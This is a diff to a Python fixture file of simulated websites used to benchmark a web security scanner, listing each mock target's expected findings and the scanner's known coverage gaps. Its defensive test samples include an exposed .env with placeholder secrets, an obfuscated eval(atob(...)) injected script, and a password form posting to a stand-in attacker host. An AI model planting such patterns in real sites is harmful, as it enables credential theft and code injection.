@@ -58,6 +58,12 @@ class GroundTruthTarget:
     html: str
     headers: dict[str, str] = field(default_factory=dict)
     status: int = 200
+    # Extra routes the mock site serves beyond "/" — path → (status,
+    # body, content_type). Lets a target simulate /admin, /.env,
+    # /api/..., a redirect, etc. so the sensitive_paths / endpoint /
+    # redirect engines have something real to find. Defaults empty
+    # (everything non-root 404s).
+    routes: tuple[tuple[str, int, str, str], ...] = ()
     expected_findings: tuple[ExpectedFinding, ...] = ()
     forbidden_findings: tuple[ExpectedFinding, ...] = ()   # FP guards
     expected_risk_min: int | None = None
@@ -217,6 +223,74 @@ _VULN: tuple[GroundTruthTarget, ...] = (
         ),
         notes="Session cookie missing Secure + HttpOnly.",
     ),
+    GroundTruthTarget(
+        name="vuln_sensitive_path",
+        category="vulnerable", framework=None,
+        html='<!DOCTYPE html><html><body>home</body></html>',
+        headers=_HTML_CT,
+        routes=(("/.env", 200,
+                 "DB_PASSWORD=secret123\nAPP_KEY=base64:xyz\nSECRET_TOKEN=abc",
+                 "text/plain"),),
+        expected_findings=(
+            ExpectedFinding("sensitive_paths", "environment variable file",
+                            min_severity="critical"),
+        ),
+        expected_risk_min=30,
+        notes="Exposed .env (mock secrets) — critical confirmed exposure.",
+    ),
+    GroundTruthTarget(
+        name="vuln_admin_portal",
+        category="vulnerable", framework=None,
+        html='<!DOCTYPE html><html><body><a href="/admin">admin</a></body></html>',
+        headers=_HTML_CT,
+        routes=(("/admin", 200,
+                 '<html><head><title>Admin Panel</title></head><body>'
+                 '<h1>Admin Panel</h1></body></html>', "text/html"),),
+        expected_findings=(
+            ExpectedFinding("sensitive_paths", "admin panel"),
+        ),
+        notes="Publicly reachable admin panel.",
+    ),
+    GroundTruthTarget(
+        name="vuln_exposed_api",
+        category="vulnerable", framework=None,
+        html=("<!DOCTYPE html><html><body><script>"
+              "fetch('/api/v1/users');fetch('/api/admin/config')"
+              "</script></body></html>"),
+        headers=_HTML_CT,
+        expected_findings=(
+            ExpectedFinding("endpoint_discovery", "admin api",
+                            min_severity="high"),
+            ExpectedFinding("endpoint_discovery", "api surface mapped"),
+        ),
+        notes="Admin API referenced from public client code.",
+    ),
+    GroundTruthTarget(
+        name="vuln_third_party_script_risk",
+        category="vulnerable", framework=None,
+        html=('<!DOCTYPE html><html><body>'
+              '<script src="https://random-unknown-xyz123.test/t.js"></script>'
+              '</body></html>'),
+        headers=_HTML_CT,
+        expected_findings=(
+            ExpectedFinding("third_party_domains",
+                            "subresource integrity"),
+        ),
+        notes="External script with no SRI from an unrecognised host.",
+    ),
+    GroundTruthTarget(
+        name="vuln_insecure_login_form",
+        category="vulnerable", framework=None,
+        html=('<!DOCTYPE html><html><body>'
+              '<form action="http://t.test/login" method="post">'
+              '<input type="password" name="pw"></form></body></html>'),
+        headers=_HTML_CT,
+        expected_findings=(
+            ExpectedFinding("form_risk", "insecure http url",
+                            min_severity="high"),
+        ),
+        notes="Password form submits to a plain-HTTP action.",
+    ),
 )
 
 
@@ -238,6 +312,47 @@ _COMPROMISED: tuple[GroundTruthTarget, ...] = (
         ),
         notes="Safe simulated hidden iframe (inert local-test URL).",
     ),
+    GroundTruthTarget(
+        name="compromised_injected_script",
+        category="compromised", framework=None,
+        html=('<!DOCTYPE html><html><body><h1>Site</h1><script>'
+              'var _0xabc=eval(atob("YWxlcnQoMSk="));'
+              'document.write(unescape("%3Cscript%3E"))'
+              '</script></body></html>'),
+        headers=_HTML_CT,
+        expected_findings=(
+            ExpectedFinding("injected_js", "decodes-and-evaluates",
+                            min_severity="high"),
+        ),
+        notes="Safe simulated injected script: decode-and-eval pattern.",
+    ),
+    GroundTruthTarget(
+        name="compromised_form_injection",
+        category="compromised", framework=None,
+        html=('<!DOCTYPE html><html><body>'
+              '<form action="https://evil-collect-xyz.test/grab" method="post">'
+              '<input type="password" name="pw"></form></body></html>'),
+        headers=_HTML_CT,
+        expected_findings=(
+            ExpectedFinding("form_risk", "credentials to a different domain",
+                            min_severity="high"),
+        ),
+        notes="Safe simulated form-jacking: password form posting off-site.",
+    ),
+    GroundTruthTarget(
+        name="compromised_supply_chain",
+        category="compromised", framework=None,
+        html=('<!DOCTYPE html><html><body>'
+              '<script src="https://cdn-suspicious-9x8z.test/lib.js"></script>'
+              '<script>eval(atob("YWxlcnQoMSk="))</script></body></html>'),
+        headers=_HTML_CT,
+        expected_findings=(
+            ExpectedFinding("third_party_domains", "subresource integrity"),
+        ),
+        forbidden_findings=(),
+        notes="Safe simulated supply-chain: external script + obfuscated "
+              "inline (correlation chain expected).",
+    ),
 )
 
 
@@ -245,6 +360,33 @@ ALL_TARGETS: tuple[GroundTruthTarget, ...] = _CLEAN + _VULN + _COMPROMISED
 CLEAN_TARGETS = _CLEAN
 VULNERABLE_TARGETS = _VULN
 COMPROMISED_TARGETS = _COMPROMISED
+
+
+# Honest record (Task 7) of spec-listed targets NOT yet in the lab and
+# WHY — these are the real coverage gaps the validation framework
+# exists to surface. Each names the blocker so a future phase can close
+# it deliberately rather than discovering the gap in production.
+KNOWN_COVERAGE_GAPS: tuple[dict[str, str], ...] = (
+    {
+        "target": "outdated_js_library",
+        "blocker": "vulnerable_libs engine exists but is not wired into "
+                   "the orchestrator pipeline (dormant) — no detection to "
+                   "validate yet.",
+    },
+    {
+        "target": "malicious_redirect",
+        "blocker": "suspicious_redirects keys off an observed redirect "
+                   "chain; a single-response mock can't present one. "
+                   "Needs a redirecting mock route or the browser pass.",
+    },
+    {
+        "target": "new_domain / supply_chain_change",
+        "blocker": "these are WADE change-detection signals — they need a "
+                   "prior baseline to diff against, so they belong in a "
+                   "WADE-specific validation harness (two-scan fixture), "
+                   "not the single-scan benchmark.",
+    },
+)
 
 
 def targets_by_category(category: str) -> tuple[GroundTruthTarget, ...]:
